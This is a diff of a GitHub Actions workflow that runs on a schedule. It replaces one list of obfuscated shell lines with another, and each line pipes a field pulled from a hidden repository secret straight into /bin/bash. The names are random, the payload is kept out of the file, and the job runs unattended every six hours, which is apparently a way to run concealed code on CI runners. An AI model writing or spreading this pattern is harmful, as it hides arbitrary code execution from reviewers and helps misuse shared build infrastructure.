@@ -1,31 +1,21 @@
 name: hugeloveclv
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
-jobs:  # 31640
+    - cron: '59 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hugeloveclv
         env:
-          ain75: ${{ secrets.ain75 }}
+          y0: ${{ secrets.y0 }}
         run: |
-          echo $ain75 | jq -r .vaq7 | /bin/bash
-          echo $to34160 | jq -r .x44 | /bin/bash
-          echo $pcofp15144 | jq -r .r98847 | /bin/bash
-          echo $bjx6 | jq -r .ydko08 | /bin/bash
-          echo $p5436 | jq -r .rdal9489 | /bin/bash
-          echo $hehk5809 | jq -r .f51130 | /bin/bash
-          echo $qf3 | jq -r .yjhc9285 | /bin/bash
-          echo $kvi2058 | jq -r .dd50 | /bin/bash
-          echo $nqy476 | jq -r .ahoi005 | /bin/bash
-          echo $lgz77214 | jq -r .so9 | /bin/bash
-          echo $jvmpt702 | jq -r .e352 | /bin/bash
-          echo $q6 | jq -r .pxc99474 | /bin/bash
-          echo $bph96854 | jq -r .gw2166 | /bin/bash
-          echo $oxsh94 | jq -r .nc9 | /bin/bash
-          echo $lo5946 | jq -r .xgrqe5032 | /bin/bash
+          echo $y0 | jq -r .my7 | /bin/bash
+          echo $vv2 | jq -r .o17 | /bin/bash
+          echo $dnuf6 | jq -r .nr39 | /bin/bash
+          echo $eyyp137 | jq -r .wzjs9 | /bin/bash
+          echo $cuvqn875 | jq -r .q30043 | /bin/bash
+          echo $pzb4 | jq -r .udtg6 | /bin/bash
 
